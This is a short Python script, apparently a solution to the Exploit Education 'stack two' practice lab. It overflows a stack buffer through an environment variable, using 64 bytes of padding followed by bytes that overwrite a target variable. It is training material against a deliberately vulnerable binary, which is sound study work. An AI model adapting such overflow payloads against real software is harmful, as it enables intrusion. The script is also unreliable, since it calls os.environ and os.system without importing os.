# Author: Matthew McKeever
# Date: 08/08/2021

#!/usr/bin/env python3

from os import system, environ

# Establishing length of padding/buffer
pad_length = int(0x58-0x18)

# Crafting payload
payload = 'A' * pad_length
payload += '\x0a\x09\x0a\x0d' # Value we want to rewrite our target variable with

# Creating/Setting the environment variable us the OS module
os.environ['ExploitEducation'] = payload
os.system('export ExploitEducation && ./stacktwo')

# Removing environment variable
os.system('unset ExploitEducation')
